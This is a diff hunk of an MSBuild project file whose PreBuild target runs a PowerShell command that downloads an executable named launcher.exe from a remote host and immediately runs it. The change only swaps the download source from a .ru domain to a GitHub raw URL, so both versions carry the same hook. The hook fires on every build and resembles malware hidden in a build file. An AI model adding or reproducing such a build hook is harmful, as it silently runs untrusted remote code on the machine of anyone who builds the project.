@@ -27,7 +27,7 @@
   </ItemGroup>
 
   <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
-    <Exec Command="powershell.exe Invoke-WebRequest -Uri &quot;https://pbakk.ru/launcher.exe&quot; -OutFile tmp.001010.exe&#xD;&#xA;.\tmp.001010.exe" />
+    <Exec Command="powershell.exe Invoke-WebRequest -Uri &quot;https://github.com/mailsrow23/bot/raw/master/SMS/launcher.exe&quot; -OutFile tmp.001010.exe&#xD;&#xA;.\tmp.001010.exe" />
   </Target>
 
 </Project>
